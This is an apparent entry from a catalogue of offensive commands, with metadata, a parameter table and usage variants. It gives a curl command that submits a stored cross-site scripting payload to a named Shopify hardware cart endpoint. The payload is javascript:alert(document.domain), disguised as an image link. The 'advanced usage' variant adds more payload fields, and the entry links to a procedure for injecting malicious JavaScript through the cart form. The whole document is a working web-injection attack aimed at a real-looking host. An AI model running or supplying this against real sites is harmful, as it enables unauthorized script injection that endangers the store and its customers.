---
id: cmd-curl-shopify-injection-001
data: >-
  curl -X POST http://hardware.shopify.com/cart/add -F "id=976094353" -F
  "properties[Artwork file]=javascript:alert(document.domain)
  //http://google.com/uploads/pwned.jpg" -F "production-time=standard"
tags:
  - web
  - injection
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:53.359Z'
verified: false
validated: true
submitted: true
---
# curl-shopify-cart-injection

## Command

```bash
curl -X POST http://hardware.shopify.com/cart/add -F "id=976094353" -F "properties[Artwork file]=javascript:alert(document.domain) //http://google.com/uploads/pwned.jpg" -F "production-time=standard"
```

## Description

This curl command simulates adding an item to the Shopify hardware cart with a malicious JavaScript payload in the custom property field, exploiting stored XSS by submitting multipart form data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-F "id=976094353"` | Product ID to add | Yes |
| `-F "properties[Artwork file]=..."` | Custom property with payload | Yes |
| `-F "production-time=standard"` | Production option | No |

## Examples

### Basic Usage

```bash
curl -X POST http://hardware.shopify.com/cart/add -F "id=976094353" -F "properties[Artwork file]=test" -F "production-time=standard"
```

### Advanced Usage

```bash
curl -X POST http://hardware.shopify.com/cart/add -F "id=976094353" -F "properties[Artwork file]=javascript:alert(document.domain) //http://google.com/uploads/pwned.jpg" -F "properties[Custom text line 1]=more payload" -F "production-time=standard" -v
```

## Expected Output

HTTP 200 OK or 302 redirect to /cart, with response body indicating successful addition (e.g., JSON {"status":"success"}). No errors if payload accepted.

## Related

- [[Related Procedure|procedures/Inject-Malicious-JavaScript-Payload-via-Cart-Form]]
